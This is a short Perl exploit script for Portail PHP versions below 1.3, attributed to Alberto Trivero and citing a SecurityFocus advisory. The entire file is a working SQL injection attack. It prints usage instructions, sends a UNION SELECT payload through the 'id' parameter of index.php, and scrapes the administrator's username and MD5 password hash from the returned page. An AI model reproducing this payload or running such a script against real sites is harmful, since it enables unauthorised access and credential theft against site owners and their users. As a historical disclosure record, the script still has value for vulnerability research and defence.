#!/usr/bin/perl -w
#
# SQL Injection Exploit for Portail PHP < 1.3
# This exploit show the username of the administrator of the portal and his password crypted in MD5
# Related advisory: http://www.securityfocus.com/archive/1/398728/2005-05-21/2005-05-27/0
# Coded by Alberto Trivero

use LWP::Simple;

print "\n\t=================================\n";
print "\t= Exploit for Portail PHP < 1.3 =\n";
print "\t= Alberto Trivero - codebug.org =\n";
print "\t=================================\n\n";

if(!$ARGV[0] or !($ARGV[0]=~m/http/)) {
   print "Usage:\nperl $0 [full_target_path]\n\n";
   print "Examples:\nperl $0 http://www.example.com/portailphp/\n";
   exit(0);
}

$url=q[index.php?affiche=Liens&id=1%20UNION%20SELECT%20null,null,null,null,null,null,US_pwd,US_nom,null%20FROM%20pphp_user/*];
$page=get($ARGV[0].$url) || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $ARGV[0]\n";
$page=~m/0000-00-00, 0  \)<\/i>     <br><br><br><br><\/td>   <\/tr>   <tr>     <td width='100%'>(.*?)<\/td>   <\/tr>/ && print "[+] Username of administrator
is: $1\n";
print "[-] Unable to retrieve username\n" if(!$1);
$page=~m/<img border='0' src='\.\/images\/ico_liens\.gif' >&nbsp;<b> <\/b>: (.*?)<\/td>/ && print "[+] MD5 hash of password is: $1\n";
print "[-] Unable to retrieve hash of password\n" if(!$1);
